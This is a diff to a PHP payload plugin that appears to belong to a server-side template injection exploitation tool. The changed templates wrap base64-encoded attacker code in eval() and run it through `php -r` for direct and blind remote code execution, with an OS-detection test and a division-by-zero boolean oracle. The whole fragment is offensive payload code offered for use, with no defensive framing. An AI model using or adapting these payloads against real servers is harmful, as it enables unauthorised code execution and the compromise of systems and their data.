@@ -26,17 +26,19 @@ class Php_generic(php.Php):
             'render_error': {
                 # Just use the wrapped payload for eval, but without ; in the end
                 'wrapper_type': "global",
-                'trailer': """)).strval({trailer[0]}+{trailer[1]}))()""",
+                'trailer': """)),strval({trailer[0]}+{trailer[1]})]),"r")""",
             },
             'evaluate': {
-                'call': 'render',
-                'evaluate': """eval(join("", ["return (", base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), ");"]))""",
+                # Dirty hack from Twig
+                'call': 'execute',
+                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                 'test_os': 'echo PHP_OS;',
                 'test_os_expected': r'^[\w-]+$'
             },
             'evaluate_boolean': {
-                'call': 'inject',
-                'evaluate_blind': """1 / (true && eval(join("", ["return (", base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), ");"])))"""
+                # Dirty hack from Twig
+                'call': 'execute_blind',
+                'evaluate_blind': """php -r '$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ");"));'""",
             },
             'evaluate_blind': {
                 'call': 'inject',
